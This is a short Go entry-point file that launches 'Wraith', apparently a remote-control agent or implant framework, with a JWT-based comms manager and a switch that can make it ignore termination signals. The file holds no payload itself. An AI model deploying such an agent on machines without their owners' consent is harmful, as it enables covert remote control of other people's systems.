package main

import (
	"os"
	"os/signal"
	"syscall"
	"time"

	"git.0x1a8510f2.space/0x1a8510f2/wraith/libwraith"
	"git.0x1a8510f2.space/0x1a8510f2/wraith/stdmod"
)

const RESPECT_EXIT_SIGNALS = true

var exitTrigger chan struct{}

func setupCloseHandler(triggerChannel chan struct{}) {
	c := make(chan os.Signal, 2)
	signal.Notify(
		c,
		syscall.SIGHUP,
		syscall.SIGINT,
		syscall.SIGQUIT,
		syscall.SIGTERM,
	)
	if RESPECT_EXIT_SIGNALS {
		go func() {
			for range c {
				triggerChannel <- struct{}{}
			}
		}()
	}
}

func init() {
	exitTrigger = make(chan struct{})
	setupCloseHandler(exitTrigger)
}

func main() {
	// Create Wraith
	w := libwraith.Wraith{}

	// Start Wraith in goroutine
	go w.Spawn(
		libwraith.Config{
			FingerprintGenerator: func() string { return "" },
		},
		&stdmod.DefaultJWTCommsManager{},
	//	&stdmod.WCommsPinecone{},
	)

	// Wait until the exit trigger fires
	<-exitTrigger

	// Kill Wraith and exit
	w.Kill()
	time.Sleep(1 * time.Second)
}
